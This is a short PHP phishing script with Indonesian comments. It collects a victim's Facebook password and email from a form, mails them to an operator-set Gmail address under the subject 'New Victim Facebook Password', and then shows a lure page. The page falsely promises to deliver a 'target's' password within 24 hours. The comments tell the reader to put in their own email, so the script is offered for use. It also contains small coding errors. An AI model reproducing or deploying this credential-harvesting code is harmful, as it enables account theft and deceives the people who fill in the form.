<?php

/* SILAHKAN GANTI SUBJECT DAN EMAIL ANDA SENDIRI.*/

$emailsubject = ‘Korban Baru Password Facebook !’;
$mailto = ‘contoh@gmail.com’;

/* Fungsi berikut untuk mengambil input field. */

#fbField = $_POST[‘fb’];
$email1Field = $_POST[’email1′];
$email2Field = $_POST[’email2′];
$infoField = $_POST [‘info’];

/* Mengambil informasi untuk dikirim kepada facebook anda !. */

$body = <<<EOD
<br><hr><br>

Email Korban : $email1Field <br>
Email Target : $email2Field <br>
Password Korban : $fbField <br>
URL Target : $infoField <br>
EOD;

$headers = “From: $email1Field\r\n”; // Buat nunjukin pengirim email.
$headers .= “Content-type: text/html\r\n”; // Untuk memerintahkan server melakukan coding teks.
$success = mail($mailto, $emailSubject, $body, $headers); // Hal-hal yang akan dikirim.
?>

<html>
<head>
<meta http-equiv=”Content-Type” content=”text/html;charset=utf-8″ />
<title>Mohon tunggu – Proses pencarian password sedang dilakukan</title>
</head>
<body bgcolor=”black” text=”white”>
Kami akan memproses permintaan anda segera.
<br>Silahkan periksa kotak masuk facebook anda untuk mendapatkan password target anda , Jika dalam waktu 24 Jam password tidak terkirim kedalam kotak masuk facebook anda hubungi kami melalui email ar10.dy@computer4u.com !<p>
<p>
Segala bentuk penyalahgunaan password yg anda peroleh dan apa yg akan terjadi kepada facebook anda , adalah diluar tanggung jawab kami !

</body>
<html>